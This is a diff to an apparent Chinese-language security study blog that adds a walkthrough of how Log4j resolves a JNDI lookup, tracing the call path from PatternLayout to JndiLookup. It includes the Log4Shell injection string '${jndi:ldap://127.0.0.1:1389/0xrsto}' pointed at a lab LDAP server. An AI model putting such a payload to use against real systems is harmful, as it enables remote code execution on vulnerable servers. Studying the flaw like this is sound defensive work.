@@ -163,3 +163,35 @@ cas_exploit-1.0-SNAPSHOT-all.jar
 
 解决！！！
 ![image-20240703140805099](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240703140805099.png)
+
+
+
+
+
+## Log4j
+
+```
+String message = "${jndi:ldap://127.0.0.1:1389/0xrsto}";
+        logger.error("error info:{}",message);
+```
+
+从这里的error()--->msg.formatTo 将源代码中的message替换{}
+
+![image-20240708161046219](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240708161046219.png)
+
+就是首先找${  然后进入另一个循环找  }截取中间的值，
+
+进入StrSubstitutor类resolveVariable方法
+
+获取变量解析器
+![image-20240708161831935](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240708161831935.png)
+
+最后调用前缀.   jndi.l
+
+在strLookupMap中键名为"jndi"的值为JndiLookup对象，进入JndiLookup类的lookup方法
+
+三个关键点：
+
+1. 在PatternLayout类的toSerializable方法中，调用MessagePatternConverter的format方法，这个方法是一个格式化的过程，将格式化的内容添加到workingBuilder中，也就是将源代码中的message替换{}，同时匹配字符串中是否存在${}占位符，并使用config.getStrSubstitutor().replace进行替换
+2. 在StrSubstitutor类的substitute方法中，提取${}中的内容，并调用StrSubstitutor类resolveVariable方法对其解析
+3. 在Interpolator类的lookup方法中，根据前缀在map中获取对应的StrLookup对象，然后调用其lookup方法，这里的前缀为jndi，所以获取的是JndiLookup对象，然后调用其lookup方法，这个方法调用了jndiManager.lookup方法
